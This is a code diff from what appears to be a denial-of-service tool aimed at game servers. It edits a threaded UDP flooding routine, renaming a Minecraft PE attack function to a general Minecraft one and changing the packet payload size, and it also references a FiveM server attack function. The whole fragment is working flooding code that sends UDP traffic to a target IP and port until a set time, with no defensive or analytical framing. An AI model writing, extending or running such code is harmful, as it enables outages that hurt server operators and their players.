@@ -543,22 +543,21 @@ def fivem_server_attack(target_ip, target_port, until_datetime):
             sock.close()
             pass
 
-def LaunchMCPE(target_ip, target_port, thread_count, duration):
+def LaunchMC(target_ip, target_port, thread_count, duration):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
     for _ in range(int(thread_count)):
         try:
-            thd = threading.Thread(target=minecraft_pe_server_attack, args=(target_ip, target_port, until))
+            thd = threading.Thread(target=minecraft_server_attack, args=(target_ip, target_port, until))
             thd.start()
         except:
             pass
             
-def minecraft_pe_server_attack(target_ip, target_port, until_datetime):
+def minecraft_server_attack(target_ip, target_port, until_datetime):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+    payload = b'\x00'
     
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            sock.sendto(payload * (1024 * 1024), (target_ip, target_port))
+            sock.sendto(payload * 1024, (target_ip, target_port))
         except:
             pass
-
